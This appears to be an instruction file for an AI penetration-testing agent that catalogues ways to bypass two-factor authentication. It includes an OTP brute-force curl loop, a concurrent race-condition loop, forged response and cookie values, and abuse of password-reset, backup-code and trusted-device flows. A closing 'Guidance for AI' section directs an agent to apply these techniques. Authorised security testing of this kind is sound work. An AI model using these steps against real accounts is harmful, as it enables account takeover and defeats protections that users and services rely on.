# Two-Factor Authentication Bypass Skill

## Goal

Identify and exploit vulnerabilities in 2FA implementations to bypass secondary authentication controls.

## Methodology

1. **Map 2FA Flow:** Understand the authentication sequence and token handling
2. **Test Direct Access:** Try accessing authenticated pages without completing 2FA
3. **Test Token Handling:** Analyze OTP generation, validation, and expiration
4. **Brute Force OTP:** If rate limiting is weak, enumerate codes
5. **Bypass Mechanisms:** Exploit backup codes, recovery flows, or logic flaws

## Direct Access Bypass

```bash
# Skip 2FA step by directly accessing protected resource
1. Complete step 1 (username/password)
2. Instead of submitting OTP, directly navigate to:
   https://target.com/dashboard
   https://target.com/account/settings

# Force browsing past 2FA
```

## Response Manipulation

```http
# Original (2FA required):
HTTP/1.1 200 OK
{"success": false, "require_2fa": true}

# Modify to:
{"success": true, "require_2fa": false}
```

## OTP Brute Force

```bash
# If 4-6 digit OTP with no rate limiting:
for i in $(seq 000000 999999); do
  curl -X POST https://target.com/verify-otp \
    -d "otp=$i&token=SESSION_TOKEN"
done

# Using Burp Intruder for faster enumeration
```

## OTP Reuse

```bash
# Test if same OTP can be used multiple times
# Test if old OTP still valid after requesting new one
```

## Backup Code Attacks

```bash
# Backup codes often:
- Have weaker validation
- Don't expire
- Can be brute forced (smaller keyspace)

# Test: Use backup code instead of OTP
```

## Race Condition

```bash
# Send multiple requests simultaneously
# May bypass rate limiting or allow code reuse
for i in {1..10}; do
  curl -X POST https://target.com/verify-otp -d "otp=123456" &
done
```

## Session Manipulation

```bash
# Remove 2FA parameter from session
# Modify "2fa_verified" cookie/parameter

# Cookie manipulation
2fa_completed=false -> 2fa_completed=true
```

## Password Reset Bypass

```bash
# Password reset may not require 2FA
1. Click "Forgot Password"
2. Reset password via email
3. Login bypasses 2FA
```

## Trusted Device Abuse

```bash
# "Remember this device" often uses weak tokens
# Steal/forge device trust token

# Check if device token is predictable
device_id=user123_browser_hash
```

## Account Recovery

```bash
# Recovery options may bypass 2FA:
- Security questions (if set before 2FA)
- Support-initiated reset
- SMS recovery (SIM swap vulnerability)
```

## Tools

* **Burp Suite** - Intercept and modify 2FA requests
* **Custom scripts** - OTP brute forcing
* **Browser DevTools** - Analyze 2FA flow

## Guidance for AI

* Activate when testing two-factor or multi-factor authentication
* First try direct access bypass (most common flaw)
* Check if 2FA status is client-side controlled
* Test rate limiting on OTP submission
* Check all alternative authentication paths (recovery, backup codes)
* Time-based OTP (TOTP) usually has 30-second windows
* Consider testing the "remember device" functionality
